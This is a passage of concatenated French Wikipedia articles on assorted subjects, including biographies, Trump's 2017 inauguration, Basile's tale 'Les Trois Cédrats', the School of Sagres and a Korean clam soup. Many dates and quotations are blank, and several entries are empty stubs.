Elle s'est intéressée notamment aux fonctions zéta p-adiques. Dans sa thèse, elle a développé la théorie des fonctions zéta p-adiques sur l'anneau des entiers algébriques (comme aussi Pierre Deligne, Kenneth Alan Ribet et Daniel Barsky), se basant sur les travaux de Jean-Pierre Serre. Elle a également travaillé sur la théorie des singularités en géométrie algébrique.
De 2005 à 2007, elle est chercheuse invitée au Radcliffe College et 1983 et 1987, elle travaille à l'Institut des hautes études scientifiques (IHÉS). En 2000 elle est invitée à l'Université complutense de Madrid, et à Oxford.
Elle est mariée avec le théoricien des nombres Philippe Cassou-Noguès (né en 1944).

</doc>
<doc id="10575923" url="https://fr.wikipedia.org/wiki?curid=10575923" title="André Aumerle">
André Aumerle

André Aumerle ( – ) est un coureur cycliste français. Il a participé à trois épreuves des Jeux olympiques d'été de 1928.

</doc>
<doc id="10575924" url="https://fr.wikipedia.org/wiki?curid=10575924" title="Anna Maria Fiorelli Lapini">
Anna Maria Fiorelli Lapini

Anna Maria Fiorelli Lapini, parfois appelée Anna Maria Lapini ou Anna Lapini, est une religieuse italienne, fondatrice des Pauvres filles des saints stigmates de saint François d'Assise ou « Stigmatines », née à Florence le , morte dans la même ville le . Dévouée aux pauvres, surnommée « la mamma de Florence » pour son dévouement pendant l'épidémie de choléra, ses vertus sont reconnues « héroïques » par l'Église catholique et elle est déclarée vénérable par Jean-Paul II le .
Biographie.
Anna Maria Fiorelli est née le à Florence dans le quartier de Santa Croce, elle est la cinquième des onze enfants de Giuseppe Fiorelli, barbier, et de Rosalinda Pecorai, modiste. Baptisée sous le prénom de Marianna, elle est généralement appelée Anna ou Annina. Comme ses frères et sœurs, elle bénéficie de l'exemple de la foi de ses parents, surtout de son père, qui participe chaque jour à la messe et fréquente l'Oratoire des disciples de saint Philippe Néri.
Mariage.
Elle désire être religieuse, mais à cause de sa pauvreté elle ne peut avoir la dot nécessaire à l'époque pour intégrer un institut religieux. Elle accepte finalement de se marier, le , avec Giovanni Lapini, un camarade d'enfance et ami de sa famille. Mais elle est malheureuse en ménage, son mari est oisif, joueur, buveur et blasphémateur. Ils n'ont pas d'enfants. Son mari se convertit ensuite mais meurt peu après, en 1842.
Début de vie religieuse, création de l'école.
Veuve, Anna Maria Lapini se retire dans la pauvreté, la prière, et se consacre aux pauvres. En 1846, avec six compagnes, elle reçoit l'habit des tertiaires de saint François. Elle choisit alors de s'appeler « Sœur Anna des Saints Stigmates ».
Dans une maison donnée par les Frères piaristes, la « villa Fantina », elle fonde sa première école. Elle y accueille les enfants les plus défavorisés de Florence, et les éduque « avec amour ».
Fondation de son ordre.
Elle fonde en 1850 l'institut des « Pauvres filles des saints stigmates de saint François d'Assise », plus tard surnommées « Stigmatines », avec comme objectifs l'éducation de la jeunesse et l'exercice des œuvres de miséricorde.
Lors de l'épidémie de choléra en 1854, elle est en première ligne avec ses religieuses pour affronter la maladie. À une sœur qui doit soigner un malade, elle déclare : .
Son institut est approuvé par le Saint-Siège de façon provisoire le . Il sera approuvé définitivement en 1888, et se diffuse rapidement.
À propos de sa fondation, elle prie en disant : 
Dernières années.
Les années s'écoulant, Mère Anna se sent de plus en plus faible, mais elle continue ses longues heures de prière et les sacrifices qu'elle s'impose. Quand un cancer lui est diagnostiqué, après une visite à ses maisons de Toscane, elle est contrainte au repos au « Portico ». Pendant ses trois mois d'agonie, quand elle laisse échapper une plainte, elle demande pardon à ses sœurs de n'être pas un modèle parfait. Elle meurt le au soir, en se tournant vers une image de saint François.
Son corps repose en l', à la maison mère de son ordre.
Procédure de béatification.
Sa cause en béatification est introduite le . Le décret sur l'héroïcité de ses vertus est promulgué le par Jean-Paul II, la déclarant ainsi « vénérable ». Sa cause est en attente de la reconnaissance d'un miracle pour que son culte puisse être officialisé, au moins localement.

</doc>
<doc id="10575925" url="https://fr.wikipedia.org/wiki?curid=10575925" title="Fortia">
Fortia



</doc>
<doc id="10575926" url="https://fr.wikipedia.org/wiki?curid=10575926" title="Madison (Pensylvannie)">
Madison (Pensylvannie)



</doc>
<doc id="10575928" url="https://fr.wikipedia.org/wiki?curid=10575928" title="Anne-Marie Gentily">
Anne-Marie Gentily

Anne-Marie Gentily née Berthe Anna Augustine Pédenau le à Neuville (Vienne) et morte le dans le est une personnalité française, première femme assesseur d'un juge au tribunal pour enfants, fondatrice et première grande maitresse de la exclusivement féminine d'Europe, la Grande Loge féminine de France.
Biographie.
Anne-Marie Pedeneau-Gentily est avant la Seconde Guerre mondiale secrétaire au contentieux au tribunal pour enfants de Paris, puis devient la première femme assesseur d'un juge.
Figure emblématique et pionnière de la franc-maçonnerie féminine, elle est initiée en 1925 dans la loge d'adoption appartenant à la Grande Loge de France, elle est élevée à la maîtrise en 1927. Elle fait partie des fondatrices de la loge d'adoption dont elle est la première vénérable maitresse de 1931 à 1937, puis vénérable maitresse d'honneur. Loge où elle rencontre Maxime Gentily qui devient sont mari.
En 1935, le convent de la Grande Loge de France, sans avoir consulté les sœurs de ses loges d'adoption, propose à la demande du grand maître Louis Doignon, d'octroyer l'autonomie la plus complète aux loges d'adoption et les à créer leur obédience exclusivement féminine. Les sœurs, n'étant pas prêtes à cet instant pour une telle création, obtiennent le statu quo. Elles créent une commission d'étude pour préparer leur indépendance. Le Congrès annuel des loges d'adoption créé en 1926 et fonctionnant de manière officieuse, est officialisé en 1936 et placé sous la présidence conjointe de Louis Doignon et d'Éliane Brault. Un grand secrétariat du congrès est créé, Anne-Marie Gentily est élue première présidente. En 1937, le congrès officiel qu'elle préside également, s'apparente à un premier convent ou huit loges sont présentes.
La Seconde Guerre mondiale met un terme à toutes activités maçonniques, de confession juive, elle rejoint en 1940 la zone libre avec son mari. Dans cette période, elle participe à la résistance française dans le mouvement Libérer et Fédérer à Lamagistère dans le Tarn-et-Garonne.
À l'issue de la guerre, elle fait partie des huit sœurs qui constituent le qui réussit à réactiver cinq loges autour de 90 sœurs environ. Elle rencontre le , avec Suzanne Galland et Germain Rheal le grand maitre de la GLDF, Dumesnil de Gramont, avec qui elles négocient les conditions de l'indépendance. Le conseil fédéral de la Grande Loge de France leur accorde les moyens financiers et techniques nécessaires à la création d'une obédience féminine. Le , se tient l’assemblée générale fondatrice de l' ou elle est élue présidente de séance à l'unanimité. Un conseil supérieur voit le jour au cours de l'assemblée sur lequel va se bâtir la future franc-maçonnerie féminine, elle est élue grande maitresse de la nouvelle obédience. Pleinement engagée dans la construction et le développement de l'obédience, elle fait partie des pionnières qui ont largement contribué à l'émergence d'un ordre initiatique féminin abouti et indépendant qui prend finalement en 1952 le nom de Grande Loge féminine de France. Elle est également reçue dans les hauts grades maçonniques du Rite écossais ancien et accepté à la suite de l'adoption définitive de celui-ci en 1959. Elle obtient son degré et ultime grade du rite en 1970, elle fait partie des neuf premiers membres du Suprême Conseil féminin de France.

</doc>
<doc id="10575944" url="https://fr.wikipedia.org/wiki?curid=10575944" title="Première investiture de Donald Trump">
Première investiture de Donald Trump

L'investiture de Donald Trump comme président des États-Unis a lieu le vendredi , "Inauguration Day". Elle a eu lieu sur les marches du Capitole à Washington, D.C. en présence du président et vice-président élus Donald Trump et Mike Pence. Elle marque le début du mandat de Trump comme président des États-Unis et celui de Mike Pence comme vice-président des États-Unis.
Contexte.
L'inauguration du marque la fin de l'administration Obama, programmée le , lorsque Donald Trump a remporté les élections présidentielles face à Hillary Clinton. Il est officiellement élu par les grands électeurs le 19 décembre.
La cérémonie se déroule en présence des anciens présidents Jimmy Carter, Bill Clinton et George W. Bush, et du président sortant Obama. George H. W. Bush et sa femme sont absents car hospitalisés au Texas. Les anciens chefs d'État sont accompagnés de leurs épouses tandis que Joe Biden, Michelle Obama et Jill Biden sont également présents.
Les familles de Donald Trump et Mike Pence sont conviées, mais la cérémonie est marquée par le boycott d'élus démocrates après que John Lewis a déclaré que le président élu était du fait des ingérences russes dans la campagne électorale. Trump avait alors critiqué Lewis ("all talk, no action"), ancienne figure du mouvement afro-américain des droits civiques.
Investiture.
À , Donald Trump et sa femme Melania Trump quittent la résidence présidentielle Blair House pour rejoindre l'église épiscopale de Saint-Jean. La cérémonie religieuse est suivie par plus de trois cents invités, dont Mike Pence et les ministres désignés du nouveau Cabinet. Puis, il se rend à la Maison-Blanche pour prendre un thé avec le président Barack Obama et son épouse. Les deux couples présidentiels se dirigent ensuite vers le Capitole pour assister à la cérémonie d'investiture. 
Avant les prestations de serment, les sénateurs Roy Blunt et Chuck Schumer font deux allocutions en tant que président du comité protocolaire et chef de la minorité au Sénat des États-Unis. À , Mike Pence prête serment comme vice-président des États-Unis sur la Bible de Ronald Reagan devant Clarence Thomas, puis à , Donald Trump prête serment comme président des États-Unis sur la Bible d'Abraham Lincoln devant John G. Roberts, avant que vingt et un coups de canon ne soient tirés.
Peu après, le nouveau président prononce un bref discours de seize minutes au cours duquel il met en avant son slogan « l'Amérique d'abord » (« "" »). Il s'agit du plus court discours d'investiture depuis celui de Jimmy Carter en 1977. Pour le politologue Vincent Michelot, . Steve Bannon et Mike Pence y voient un écho de celui prononcé par Andrew Jackson en 1829. Selon les sources, Steve Bannon et Stephen Miller, directeur politique de Donald Trump, sont respectivement considérés comme les principaux auteurs du discours.
À , l'ancien président Barack Obama et sa femme Michelle montent dans le Marine One, hélicoptère par lequel ils quittent le Congrès pour rejoindre Air Force One en direction de la Californie. Quelques instants auparavant, l'ancien vice-président Joe Biden et sa femme Jill furent conduits à la gare de Washington Union Station, de laquelle ils prennent un train pour le Delaware.
Affluence.
La cérémonie d'investiture attire environ , soit un niveau inférieur aux précédentes depuis celle de Bill Clinton en 1997, et en particulier à celles de Barack Obama (1,8 million en 2009, 1 million en 2013). Sean Spicer, porte-parole de la Maison Blanche, affirme au contraire que la foule , alors que les images démentent clairement une telle assertion.

</doc>
<doc id="10575946" url="https://fr.wikipedia.org/wiki?curid=10575946" title="Joseph-Xavier Fournier">
Joseph-Xavier Fournier

Joseph-Xavier Fournier, né le à Marseille, et mort dans la même ville le , est un archiviste français.
Biographie.
Né au quartier de la Belle de Mai, Joseph Fournier entre le aux archives départementales des Bouches-du-Rhône où il travaille sous la direction de Louis Blancard puis de Félix Reynaud. Au départ de ce dernier, il ne peut prendre sa succession, faute de diplômes. Il est alors recruté par la chambre de commerce et d'industrie de Marseille où il deviendra le chef des services historiques jusqu'à sa retraite. Il réorganise la bibliothèque et crée le service des archives ainsi que le musée de la chambre. 
Il est élu membre de l'Académie de Marseille le et en sera le secrétaire perpétuel de 1941 à 1948.
Pendant la Première Guerre mondiale, il préside la commission départementale du Ravitaillement, ce qui lui vaut d'être nommé chevalier de la Légion d'honneur.
Publications.
Joseph-Xavier Fournier écrit de nombreux articles et ouvrages sur l'histoire de la marine et celle de la chambre de commerce et d'industrie de Marseille, parmi lesquels :

</doc>
<doc id="10575949" url="https://fr.wikipedia.org/wiki?curid=10575949" title="Les Trois Cédrats">
Les Trois Cédrats

Les Trois Cédrats (en napolitain : "Le tre cetra") constitue le dernier conte (Cinquième journée, neuvième divertissement) du recueil de Giambattista Basile, le "Conte des contes", ou "Pentamerone". Il représente une version du du thème de "L'Amour des trois oranges", titre d'un conte fantastique de Carlo Gozzi (1761), qui a lui-même inspiré l'opéra du même nom de Sergueï Prokofiev.
Résumé.
Le roi de Longue Tour a un fils qui méprise les femmes et refuse de se marier. Un jour pourtant, en se blessant au doigt, il laisse tomber deux gouttes de sang dans du caillé, et le mélange qui en résulte lui inspire le désir d'une femme au teint aussi blanc que ce fromage et aussi rouge que ce sang. Il exige de son père de pouvoir partir à la recherche de cette beauté, et celui-ci finit par s'y résoudre, lui fournissant une poignée d'écus et quelques serviteurs.
Le prince mène sa quête à travers de multiples contrées. Abandonnant au passage sa suite sur un rivage de France, il finit par aborder à l'« île des ogresses », où il rencontre une vieille femme très laide à laquelle il expose le but de sa quête. La vieille femme l'encourage à se sauver au plus vite pour échapper à ses trois ogres de fils. La scène se répète auprès d'une deuxième vieille dans un autre pays. Il rencontre finalement une troisième vieille qui se montre bien plus accueillante, l'invite à déjeuner et lui remet trois cédrats et un couteau. Elle lui recommande de s'en retourner en Italie, et lorsqu'il parviendra à une fontaine en vue de son royaume, de couper en deux un cédrat : il en sortira une fée à laquelle il devra immédiatement donner de l'eau à boire, sans quoi elle disparaîtra. S'il n'y réussit ni avec le premier ni le deuxième cédrat, qu'il ne manque pas son coup la troisième fois, et il obtiendra une femme selon son cœur.
Le prince remercie la vieille et regagne les abords de son pays. Arrivé à une fontaine, il coupe un cédrat comme le lui a prescrit la vieille, mais la fée qui en sort est si belle qu'il en reste bouche bée et ne parvient pas à lui donner à temps l'eau qu'elle réclame, à la suite de quoi elle disparaît. Il en est de même la deuxième fois. La troisième fois il parvient enfin à désaltérer la créature et se retrouve avec une merveilleuse jeune fille entre les bras. Il lui enjoint de l'attendre dans un chêne vert tandis qu'il va quérir auprès de son père le costume et l'escorte qu'elle mérite.
Pendant son absence, une esclave noire vient puiser de l'eau à la fontaine. Apercevant dans l'eau le reflet de la fée au-dessus d'elle, elle croit qu'il s'agit de sa propre image, et, se prenant soudain pour une beauté, en brise sa cruche de dédain. La scène se répète le lendemain avec un tonnelet ; le troisième jour, la maîtresse de l'esclave, hors d'elle de se voir si mal servie, la bat et lui confie une outre en lui ordonnant de rapporter cette fois de l'eau si elle ne veut pas être rossée bien plus copieusement encore. L'esclave, maugréant, perce l'outre de trous, ce qui fait rire la fée dans l'arbre, à la suite de quoi l'esclave comprend son erreur et fait raconter son histoire à la fée. Sous prétexte de la coiffer, elle lui enfonce alors une épingle dans la tête : la fée se transforme en colombe et s'envole. L'esclave prend sa place dans l'arbre et salue le retour du prince comme si elle était la fée qu'il y avait laissée. Celui-ci, stupéfait et dépité de la transformation de sa belle, l'habille malgré tout et prend le chemin de son royaume en sa compagnie. En route, ils rencontrent le roi et la reine, parents du prince, qui malgré leur tristesse devant ce couple si mal assorti, renoncent au trône en faveur de leur fils et de sa moricaude.
Tandis que la noce se prépare, apparaît une colombe qui interpelle le cuisinier, lui demandant « ce que le fait le roi fait avec la sarrasine ». Informée, la fiancée ordonne de transformer la colombe en pâté. Le cuisinier s'exécute et jette les plumes dans un vase : trois jours plus tard, un beau cédratier y a poussé. Encore trois jours, et trois cédrats s'y épanouissent, pareils à ceux que la vieille avait donnés au prince. Celui-ci les cueille et les coupe en deux. Comme la première fois, des deux premiers fruits sort une fée qui disparaît rapidement, mais du troisième cédrat surgit la belle jeune femme qu'il avait serrée dans ses bras. Le prince l'entraîne dans la salle du banquet de noces, et demande à l'assistance ce que mériterait celui qui ferait du tort à une telle beauté. Tous suggèrent des châtiments divers, jusqu'à ce que la fausse fiancée noire, interrogée à son tour, déclare qu'une telle personne devrait être brûlée, et ses cendres jetées du haut du château. Le prince lui répond qu'elle a décrit son propre supplice, et la fait brûler, et éparpiller ses cendres.
Commentaires et analogies.
Ce récit est associé au conte-type AT 408, "Les Trois Oranges". Il fait appel au thème plus général de la fiancée substituée ; toutefois, comme le signale Stith Thompson, ce conte-type, probablement d'origine italienne, semble essentiellement confiné à l'Europe méridionale (Italie, Espagne, Portugal, Grèce), ainsi qu'à la Hongrie et à la Turquie. Le fait qu'on le retrouve parfois en Perse et en Inde ne permet pas d'en inférer une origine orientale. Il est absent des Contes de Grimm, ainsi que de la collecte d'Afanassiev.
Hans-Jörg Uther indique différentes variantes de la trame du récit. Le prince a parfois à l'origine été insolent avec une vieille femme, ou a brisé sa jarre, à la suite de quoi elle lui jette un sort, le condamnant à tomber amoureux de trois oranges (ou citrons, ou autres fruits, ou jeunes filles d'origine magique). Les jeunes filles qui sortent (souvent nues) des fruits peuvent demander, non de l'eau, mais un peigne, un miroir, un vêtement, etc. La négresse est parfois remplacée par une tzigane ou une sorcière, qui fournit au prince différents types d'explications à son soudain changement d'apparence (dû au soleil, au vent...) Pour prendre la place de la fiancée du prince, la fausse fiancée, soit recourt comme ici à une épingle, soit jette la vraie fiancée dans la fontaine, où elle se transforme en poisson ou en oiseau, que l'usurpatrice fait tuer ; mais de ses restes pousse un arbre, qu'elle fait alors abattre ; la jeune femme renaîtra d'un éclat de bois, ou de la souche, et finira par se faire reconnaître du prince. Uther note une dizaine de combinaisons fréquentes entre ce conte et d'autres contes-types.
Delarue et Tenèze fournissent comme exemple du conte-type 408 une version nivernaise abrégée, recueillie en 1886 dans la région de Tannay. Ce récit incorpore de nombreux éléments hétérogènes : on y retrouve notamment un motif présent dans le conte russe intitulé "La Baba Yaga", où l'héroïne se concilie les bonnes grâces d'animaux et d'objets divers en prenant soin d'eux ; lorsque la sorcière veut les lancer à la poursuite de l'héroïne, ils répondent que celle-ci les a bien traités, alors que la sorcière ne s'en est jamais souciée, et refusent d'obéir. Les jeunes femmes qui surgissent des oranges et que le prince n'a pu désaltérer tombent mortes. Le personnage de l'esclave noire y est remplacé par la fille traîtresse (et rousse) d'un ami du prince, et la colombe redevient une belle jeune femme lorsque le prince retire de sa tête l'épingle qui y était restée fichée. Delarue mentionne entre autres une version de Charles Deulin, "Désiré d'amour" et une autre de Claude Seignolle, "Les trois pommes". Ils indiquent deux monographies d'Emmanuel Cosquin, consacrées, l'un au motif de l'épingle enchantée, l'autre à celui du sang sur la neige.
Comme dans l'ensemble du "Pentamerone", le style de ce dernier conte du recueil, qui rejoint le récit-cadre (l'histoire de l'esclave noire est similaire à celle de Lucia, qui a dépossédé la princesse Zoza de son prince, et Lucia cherche à empêcher la conteuse d'aller jusqu'au bout de son histoire) est baroque, truculent et ironique. Le portrait, très chargé, de la « moricaude » et de son parler « petit-nègre » ("« moi pas être esclave lippue, moi pas être vilaine Mauresque, moi pas être grosse mollasse, moi être beauté »", selon la traduction de F. Decroisette), serait inimaginable dans la littérature actuelle.

</doc>
<doc id="10575950" url="https://fr.wikipedia.org/wiki?curid=10575950" title="Bernard Aryee">
Bernard Aryee

Bernard Nii Aryee est un footballeur ghanéen né le à Accra. Il évoluait au poste de milieu de terrain.
Biographie.
En club.
Bernard Aryee joue au Ghana, aux Pays-Bas et à Singapour.
En équipe nationale.
Il dispute la Coupe du monde des moins de 16 ans en 1989, disputant trois matchs lors de la compétition et marquant un but contre Cuba. 
Il est médaillé de bronze avec le Ghana lors des Jeux olympiques d'été de 1992. Il dispute quatre matchs lors du tournoi olympique.
International ghanéen, il reçoit six sélections en équipe du Ghana entre 1996 et 1999.
Palmarès.
"Avec Hearts of Oak :"
"Avec l'AZ Alkmaar :"
"Avec le Ghana :"

</doc>
<doc id="10575964" url="https://fr.wikipedia.org/wiki?curid=10575964" title="Luiza Galiulina">
Luiza Galiulina

Luiza Galiulina est une gymnaste artistique ouzbèke, née le à Tachkent.
Carrière.
Elle représente son pays aux Jeux olympiques de 2008 à Pékin, puis aux Championnats du monde de Londres en 2009.
En 2010, elle remporte deux médailles de bronze aux Jeux asiatiques à Canton, en poutre et en concours général par équipes. Elle termine du concours général individuel lors de cette compétition. La même année, elle participe aux Championnats du monde à Rotterdam, où elle réalise son meilleur résultat individuel à ce niveau avec une place en poutre lors des qualifications. Elle concourt pour la troisième fois aux Championnats du monde à Tokyo en 2011.
Elle doit à nouveau représenter l'Ouzbékistan pour les Jeux olympiques de 2012 à Londres, mais elle en est exclue à cause d'un contrôle positif au diurétique furosemide (considéré comme un produit masquant) réalisé le , quelques jours avant le début des Jeux. Elle est ensuite suspendue six mois de compétition par la Fédération internationale de gymnastique, qui considère que Luiza Galiulina a été déjà suffisamment sanctionnée par son expulsion des Jeux et qu'une plus longue suspension signerait l'arrêt de sa carrière sportive, mais l'Agence mondiale antidopage (AMA) fait appel auprès du Tribunal arbitral du sport (TAS) en estimant que la sanction est insuffisante. Le TAS donne raison à l'AMA en portant la suspension à deux ans (à partir du ), avec en outre l'annulation des résultats entre le et le début de la suspension.
Elle peut officiellement participer à de nouvelles compétitions à partir du mais elle n'a pas été sélectionnée en équipe nationale depuis.

</doc>
<doc id="10575967" url="https://fr.wikipedia.org/wiki?curid=10575967" title="Gnathopalystes ferox">
Gnathopalystes ferox

Gnathopalystes ferox est une espèce d'araignées aranéomorphes de la famille des Sparassidae.
Distribution.
Cette espèce est endémique du Vanuatu.
Description.
La carapace de la femelle holotype mesure de long sur et l'abdomen de long sur .

</doc>
<doc id="10575973" url="https://fr.wikipedia.org/wiki?curid=10575973" title="Vorontsov-Vel'yaminov Interacting Galaxies">
Vorontsov-Vel'yaminov Interacting Galaxies



</doc>
<doc id="10575975" url="https://fr.wikipedia.org/wiki?curid=10575975" title="Art textile">
Art textile



</doc>
<doc id="10575976" url="https://fr.wikipedia.org/wiki?curid=10575976" title="Église Saint-Martin de Yèbles">
Église Saint-Martin de Yèbles

L’église Saint-Martin est située à Yèbles dans le département français de Seine-et-Marne, en région Île-de-France.
Historique.
Sa construction initiale remonte au , le chœur est du et la nef, épaulée de contreforts, alternativement avec de petites baies plein cintre, restaurée au . 
Rattachement.
L'église fait partie du Pôle missionnaire de Mormant qui est rattachée au diocèse de Meaux.
Architecture.
Terminé par un chevet quadrangulaire, l'église de style roman est de plan allongé rectangulaire. Elle comporte un chœur droit et une tour-clocher engagée sur le côté nord de l'édifice.
La toiture est en bâtière.
Mobilier.
L'église Saint-Martin possède plusieurs objets classés monument historique dont un retable du maitre-autel de 1598, un calvaire du et :

</doc>
<doc id="10575984" url="https://fr.wikipedia.org/wiki?curid=10575984" title="Joachim Acheampong">
Joachim Acheampong



</doc>
<doc id="10575993" url="https://fr.wikipedia.org/wiki?curid=10575993" title="Sun Structures">
Sun Structures

 est le premier album du groupe britannique de rock psychédélique Temples sorti en sur le label Heavenly Recordings. L'album a été globalement bien accueilli par les critiques. En , une version remaniée de l'album sort sous le nom de "".
Accueil critique.
L'accueil critique réservé à l'album est plutôt bon puisqu'il a un score agrégé de 70/100 sur Metacritic. "Rolling Stone" et "The Guardian" lui donnent trois étoiles sur cinq possibles, l'auteur de l'article du "Guardian" regrette cependant l'absence de prise de risque du groupe qui reste dans des territoires musicaux connus. L'hebdomadaire spécialisé "New Musical Express" le note 4 sur 5 et compare les sonorités des guitares à celles du groupe australien Tame Impala. Le site musicOMH octroie 4,5 étoiles sur 5 à l'album. En France, l'hebdomadaire "Les Inrockuptibles" affirme que "Sun Structures" « affiche une cohérence qui pousse à la transe ».

</doc>
<doc id="10575996" url="https://fr.wikipedia.org/wiki?curid=10575996" title="Police Story 2013">
Police Story 2013



</doc>
<doc id="10576001" url="https://fr.wikipedia.org/wiki?curid=10576001" title="Amable Vilain de Saint-Hilaire">
Amable Vilain de Saint-Hilaire



</doc>
<doc id="10576003" url="https://fr.wikipedia.org/wiki?curid=10576003" title="King's Cross (Harry Potter)">
King's Cross (Harry Potter)



</doc>
<doc id="10576004" url="https://fr.wikipedia.org/wiki?curid=10576004" title="(21229) Susil">
(21229) Susil



</doc>
<doc id="10576005" url="https://fr.wikipedia.org/wiki?curid=10576005" title="École de Sagres">
École de Sagres

LÉcole de Sagres (en portugais "Escola de Sagres") est selon un groupe de scientifiques portugais formé autour d'Henri le Navigateur au cours du . Réunie au sein de la forteresse de Sagres près du Cap Saint-Vincent, l'extrémité sud-ouest de la péninsule ibérique, elle rassemblait les plus éminentes personnalités liées à la navigation océanique.
Bien qu'il soit démontré que le port voisin de Lagos fut le départ de nombreuses expéditions d'exploration, de pillage et de la colonisation vers les îles et côtes africaines de l'Atlantique, l'existence de l'École de Sagres est mise en doute par l'historien brésilien Fábio Pestana Ramos, la considérant comme un mythe de l'histoire portugaise. Néanmoins tous les historiens conviennent que seulement après la mort du prince Henri (en 1460), le centre d'impulsions des explorations portugaises fut centralisé à Lisbonne.
La première mention écrite du concept de l'École de Sagres date du , par Damião de Góis.
Controverse.
C'est au que commence à se développer la théorie selon laquelle le prince Henri aurait installé sa cour à Sagres en 1418, peu de temps après la prise de Ceuta par les Portugais. Il serait formé autour de lui le meilleur de ainsi que la construction d'un chantier naval et du premier observatoire au Portugal. Sagres aurait représenté la refondation moderne de . nuancent qu'il s'agissait davantage d'un concept, lieu de rencontre pour les marins et les scientifiques pour échanger des informations techniques plutôt que d'une école nautique selon la définition moderne du mot.
Le diversité religieuse (juifs, musulmans, chrétiens) des membres présumés de l'école de Sagres, et même la possibilité de les relier indirectement avec les Templiers, compte tenu du fait que le prince Henri était Grand-maître de l'Ordre du Christ, a développé les spéculations et le romantisme autour de cette institution.
Explorations portugaises au siècle.
Au cours de la période d’existence de l'École, le Portugal augmenta sensiblement son empire colonial ainsi que ses connaissances cartographiques dans l'Atlantique. En 1419, João Gonçalves Zarco découvre l'île de Porto-Santo puis l’île de Madère l'année suivante. Diogo de Silves découvre l'archipel des Açores en 1427. En 1437, Gil Eanes double le Cap Noun puis le Cap Bojador. À partir de ce point, la "Mer des Ténèbres" était crainte par les géographes arabes pour la difficulté du voyage retour, et d'une navigation contre les vents dominants. Ce problème finit par être réglé par une navigation en haute mer, loin de la côte. L'invention de la Caravelle, caractérisée par sa robustesse, un tonnage de , et 1, 2 ou à voiles latines permit les voyages d'exploration au-delà de ces limites.

</doc>
<doc id="10576006" url="https://fr.wikipedia.org/wiki?curid=10576006" title="Minville">
Minville

Minville est un patronyme porté notamment par :

</doc>
<doc id="10576011" url="https://fr.wikipedia.org/wiki?curid=10576011" title="L'Apostat">
L'Apostat

L'Apostat (titre original : "The Apostate") est une nouvelle américaine de Jack London publiée aux États-Unis en 1906.
Historique.
La nouvelle est publiée initialement dans le "Woman's Home Companion" en , avant d'être reprise dans le recueil "When God Laughs and Other Stories" en .
La nouvelle préoriginale porte le sous-titre "Une parabole du travail des enfants", situation vécue par Jack London lui-même, qui a travaillé dans une usine de conserves, dans une fabrique de jute et dans une centrale électrique pendant son adolescence.
Résumé.
« - Je travaillerai plus jamais.
- Mon dieu, Johnny, ne dis pas une chose pareille ! » gémit-elle.
Ce qu'il venait de dire était un blasphème à ses oreilles. Elle était aussi choquée par ces mots qu'une mère qui entendrait son fils nier l'existence de Dieu.
À dix-huit ans, après avoir trimé dans les usines depuis l'âge de sept ans, Johnny se hisse dans un wagon de marchandises vide ...

</doc>
<doc id="10576037" url="https://fr.wikipedia.org/wiki?curid=10576037" title="Alimi">
Alimi



</doc>
<doc id="10576055" url="https://fr.wikipedia.org/wiki?curid=10576055" title="Jaecheop-guk">
Jaecheop-guk

Le jaecheop-guk (en hangul : 재첩국 ; prononciation : [tɕɛ.tɕʰʌp̚.k͈uk̚]) est une soupe coréenne préparée à partir de palourdes d'eau douce appelées "jaecheop" (재첩, "Corbicula leana"). C'est une spécialité de la province de Gyeongsang, dans laquelle les palourdes sont récoltées, notamment dans le cours inférieur des fleuves Nakdong, Seomjin et Suyeong, les cours d'eau des environs de Gimhae, Myeongji, Eumgung et Hadan.
La préparation de cette soupe demande de faire bouillir les palourdes avec de la ciboule, de la cébette, de l'ail émincé et du sel. Elle fait partie des soupes utilisées comme remède contre la gueule de bois ("haejangguk").

</doc>
<doc id="10576060" url="https://fr.wikipedia.org/wiki?curid=10576060" title="Gustave Dalby">
Gustave Dalby

Gustave Dalby ou d'Alby, né Gustave Chapais peut-être en à Rouen et mort le à Pontoise, est un auteur dramatique français du .
Biographie.
Louis Gustave Chapais naît vers 1828, fils de François Chapais, un ancien employé des douanes de Rouen, lui-même auteur — notamment, en collaboration avec Jean-Joaquim du Bel Air, d'un "Manuel des élégants et des élégantes" en 1805. 
Établi à Paris, Gustave Chapais signe entre 1828 et 1834, sous le pseudonyme de Gustave Dalby ou d'Alby, plusieurs pièces, représentées entre autres au théâtre du Panthéon. 
En 1847, il épouse à Batignolles Antonia Emma Anaïs Grandjean de Montigny. 
Alors sous-chef de gare du Chemin de fer du Nord à La Chapelle-Saint-Denis et y résidant, il meurt l'année suivante à l'âge de quarante ans, à Pontoise, sous le nom de Gustave de Chapais. 

</doc>
<doc id="10576062" url="https://fr.wikipedia.org/wiki?curid=10576062" title="Laeticia N'cho">
Laeticia N'cho

Leticia Flore Erika N'cho, née le en Côte d'Ivoire, est une personnalité publique ivoirienne. Elle a été élue Miss Côte d'Ivoire 1998, après le titre de première dauphine Miss Aboisso 1998. Elle s'est classée deuxième (première dauphine) au concours Miss CEDEAO (Communauté économique des États de l'Afrique de l'Ouest) 1998.
Biographie.
Enfance et études.
Elle a passé toute son enfance en Côte d'ivoire. Après son élection à Miss Côte d'Ivoire en 1998, elle intègre l'INPHB, l'Institut national polytechnique Félix Houphouët-Boigny, avant de partir continuer ses études en France à Angers.
En 1999, .
Carrière professionnelle.
Leticia N’Cho, directrice générale de Groupe Addict, .
Elle démissionne de ses fonctions de directrice générale de Côte Ouest en 2015 et c'est en 2016 qu'. Spécialisé dans l'accompagnement des entreprises en matière de conseil en stratégie d'entreprise et Business développement. Elle se consacre à l'accompagnement des PME et groupes sur diverses problématiques inhérentes à la vie d’entreprise. Son groupe est composé de cinq filiales dans les domaines de la communication, la conciergerie de luxe, la restauration hors domicile et l’immobilier. Elle est depuis 2015 et jusqu'à 2021, pendant sept années consécutives, dans le classement ' Choiseul Africa, – les leaders économiques de demain publié par "Forbes Magazine" et a été classée en 2013, leader du futur du forum Crans Montana à Bruxelles. Elle a remporté le le prix de la femme entrepreneure business africa de l'année, organisé par l'AGYP ('), le MEDEF, Business Africa et l'Institut Choiseul.

</doc>
<doc id="10576063" url="https://fr.wikipedia.org/wiki?curid=10576063" title="Divenire">
Divenire

Divenire est un album du compositeur et pianiste italien Ludovico Einaudi, enregistré en 2006.
Historique.
L'album est paru le 27 octobre 2006 en Italie. Enregistré la même année à Liverpool au "Royal Philharmonic Hall" (2, 6 et 12), à Longiano au "Teatro Petrella", ainsi qu'un extrait "live" enregistré à Pesaro (4) en 2005. 
Une seconde édition du 7 novembre 2006 intègre un bonus track (13) également téléchargeable. Une troisième édition en 2 CD, est paru le 5 novembre 2007, avec 3 remixes en CD bonus ou téléchargeables sur le site officiel. 
